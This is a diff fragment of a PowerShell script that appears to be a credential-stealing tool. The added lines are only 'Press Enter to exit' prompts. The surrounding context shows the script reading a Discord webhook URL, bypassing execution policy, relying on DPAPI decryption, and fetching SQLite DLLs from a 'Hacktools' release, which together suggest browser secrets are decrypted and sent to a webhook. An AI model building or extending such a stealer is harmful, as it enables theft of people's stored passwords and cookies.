@@ -3,6 +3,9 @@ $WebhookUrl = $env:DISCORD_WEBHOOK_URL
 
 if ([string]::IsNullOrEmpty($webhookUrl)) {
     Write-Error "No webhook URL set. Exiting."
+    if ($Host.Name -match 'ConsoleHost') {
+        Read-Host "Press Enter to exit"
+    }
     exit 1
 }
 
@@ -14,6 +17,9 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
         $pwshPath = $pwshCmd.Source
         Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
         & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
+        if ($Host.Name -match 'ConsoleHost') {
+            Read-Host "Press Enter to exit"
+        }
         exit
     }
     else {
@@ -21,6 +27,7 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
         # Continue running script in PS5 but only DPAPI decryption will be used
     }
 }
+
 
 # URLs for SQLite DLLs (64-bit)
 $sqliteInteropUrl = "https://github.com/BlueJuice1/Hacktools/releases/download/V1.0/SQLite.Interop.dll"
